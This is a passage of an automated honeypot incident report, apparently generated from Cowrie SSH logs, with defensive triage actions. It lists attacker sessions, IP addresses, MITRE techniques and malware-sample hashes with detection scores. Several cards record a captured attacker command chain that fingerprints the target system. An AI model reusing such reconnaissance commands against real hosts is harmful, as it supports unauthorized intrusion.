| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.command.input` |
| `2026-08-23 18:45:07` | `cowrie.log.closed` |
| `2026-08-23 18:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf24ca7961e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 18:46 |
| **Last Seen** | 2026-08-23 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:46:07` | `cowrie.session.connect` |
| `2026-08-23 18:46:07` | `cowrie.client.version` |
| `2026-08-23 18:46:07` | `cowrie.client.kex` |
| `2026-08-23 18:46:07` | `cowrie.login.success` |
| `2026-08-23 18:46:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:46:07` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a581098cfafc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:46 |
| **Last Seen** | 2026-08-23 18:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:46:51` | `cowrie.session.connect` |
| `2026-08-23 18:46:51` | `cowrie.client.version` |
| `2026-08-23 18:46:52` | `cowrie.client.kex` |
| `2026-08-23 18:46:52` | `cowrie.login.success` |
| `2026-08-23 18:46:53` | `cowrie.session.params` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.success` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:53` | `cowrie.command.input` |
| `2026-08-23 18:46:54` | `cowrie.log.closed` |
| `2026-08-23 18:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b84bba3557

| Field | Detail |
|---|---|
| **Source IP** | `190.60.37[.]146` |
| **First Seen** | 2026-08-23 18:47 |
| **Last Seen** | 2026-08-23 18:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:47:33` | `cowrie.session.connect` |
| `2026-08-23 18:47:33` | `cowrie.client.version` |
| `2026-08-23 18:47:33` | `cowrie.client.kex` |
| `2026-08-23 18:47:35` | `cowrie.login.success` |
| `2026-08-23 18:47:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.60.37[.]146` to AbuseIPDB if not already reported
- [ ] Block `190.60.37[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1437b3684c01

| Field | Detail |
|---|---|
| **Source IP** | `61.145.250[.]147` |
| **First Seen** | 2026-08-23 18:47 |
| **Last Seen** | 2026-08-23 18:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:47:40` | `cowrie.session.connect` |
| `2026-08-23 18:47:41` | `cowrie.client.version` |
| `2026-08-23 18:47:41` | `cowrie.client.kex` |
| `2026-08-23 18:47:43` | `cowrie.login.success` |
| `2026-08-23 18:47:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.250[.]147` to AbuseIPDB if not already reported
- [ ] Block `61.145.250[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50a3eb80dde

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:48 |
| **Last Seen** | 2026-08-23 18:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:48:42` | `cowrie.session.connect` |
| `2026-08-23 18:48:42` | `cowrie.client.version` |
| `2026-08-23 18:48:43` | `cowrie.client.kex` |
| `2026-08-23 18:48:44` | `cowrie.login.success` |
| `2026-08-23 18:48:45` | `cowrie.session.params` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.success` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.command.input` |
| `2026-08-23 18:48:45` | `cowrie.log.closed` |
| `2026-08-23 18:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5680d4802535

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:50 |
| **Last Seen** | 2026-08-23 18:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:50:40` | `cowrie.session.connect` |
| `2026-08-23 18:50:40` | `cowrie.client.version` |
| `2026-08-23 18:50:40` | `cowrie.client.kex` |
| `2026-08-23 18:50:41` | `cowrie.login.success` |
| `2026-08-23 18:50:42` | `cowrie.session.params` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.success` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.command.input` |
| `2026-08-23 18:50:42` | `cowrie.log.closed` |
| `2026-08-23 18:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adebb03252d2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:51 |
| **Last Seen** | 2026-08-23 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:51:00` | `cowrie.session.connect` |
| `2026-08-23 18:51:00` | `cowrie.client.version` |
| `2026-08-23 18:51:00` | `cowrie.client.kex` |
| `2026-08-23 18:51:01` | `cowrie.login.success` |
| `2026-08-23 18:51:01` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:51:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:51:01` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074581e248ef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 18:51 |
| **Last Seen** | 2026-08-23 18:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:51:04` | `cowrie.session.connect` |
| `2026-08-23 18:51:04` | `cowrie.client.version` |
| `2026-08-23 18:51:04` | `cowrie.client.kex` |
| `2026-08-23 18:51:06` | `cowrie.login.success` |
| `2026-08-23 18:51:06` | `cowrie.direct-tcpip.request` |
| `2026-08-23 18:51:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 18:51:06` | `cowrie.direct-tcpip.data` |
| `2026-08-23 18:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2a13fd929e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:52 |
| **Last Seen** | 2026-08-23 18:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:52:43` | `cowrie.session.connect` |
| `2026-08-23 18:52:43` | `cowrie.client.version` |
| `2026-08-23 18:52:43` | `cowrie.client.kex` |
| `2026-08-23 18:52:44` | `cowrie.login.success` |
| `2026-08-23 18:52:45` | `cowrie.session.params` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.success` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.command.input` |
| `2026-08-23 18:52:45` | `cowrie.log.closed` |
| `2026-08-23 18:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7037e589c476

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:54 |
| **Last Seen** | 2026-08-23 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:54:55` | `cowrie.session.connect` |
| `2026-08-23 18:54:55` | `cowrie.client.version` |
| `2026-08-23 18:54:55` | `cowrie.client.kex` |
| `2026-08-23 18:54:56` | `cowrie.login.success` |
| `2026-08-23 18:54:57` | `cowrie.session.params` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.success` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.command.input` |
| `2026-08-23 18:54:57` | `cowrie.log.closed` |
| `2026-08-23 18:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.128[.]149` | **60** | 2026-08-23 16:59 | 2026-08-23 18:53 | 30m | 0 | `T1592` | 🟠 MEDIUM |
| `134.209.229[.]23` | **15** | 2026-08-23 17:05 | 2026-08-23 18:54 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-23 16:56 | 2026-08-23 18:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.222.42[.]14` | **4** | 2026-08-23 18:29 | 2026-08-23 18:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | **2** | 2026-08-23 17:49 | 2026-08-23 17:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-08-23 17:59 | 2026-08-23 18:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]132` | **2** | 2026-08-23 17:58 | 2026-08-23 17:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-08-23 18:05 | 2026-08-23 18:25 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.102.49[.]155` | **2** | 2026-08-23 18:11 | 2026-08-23 18:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-08-23 17:17 | 2026-08-23 17:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `150.221.247[.]120` | 1 | 2026-08-23 16:57 | 2026-08-23 16:57 | 12s | 0 | `T1592` | 🟢 LOW |
| `152.202.26[.]219` | 1 | 2026-08-23 17:33 | 2026-08-23 17:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.233.29[.]157` | 1 | 2026-08-23 18:15 | 2026-08-23 18:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.197[.]168` | 1 | 2026-08-23 17:58 | 2026-08-23 18:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.44.6[.]221` | 1 | 2026-08-23 17:30 | 2026-08-23 17:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.179.194[.]21` | 1 | 2026-08-23 16:57 | 2026-08-23 16:57 | 2s | 0 | `T1592` | 🟢 LOW |
| `2.184.236[.]166` | 1 | 2026-08-23 17:10 | 2026-08-23 17:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-23 18:39 | 2026-08-23 18:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.121[.]13` | 1 | 2026-08-23 18:49 | 2026-08-23 18:49 | 11s | 0 | `T1592` | 🟢 LOW |
| `37.255.197[.]138` | 1 | 2026-08-23 17:10 | 2026-08-23 17:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `8.134.124[.]8` | 1 | 2026-08-23 17:25 | 2026-08-23 17:26 | 30s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-08-23 17:57 | 2026-08-23 17:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.255.161[.]39` | 1 | 2026-08-23 18:27 | 2026-08-23 18:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.102.111[.]211` | 1 | 2026-08-23 17:57 | 2026-08-23 17:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-08-23 18:10 | 2026-08-23 18:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.171.242[.]207` | 1 | 2026-08-23 18:20 | 2026-08-23 18:20 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
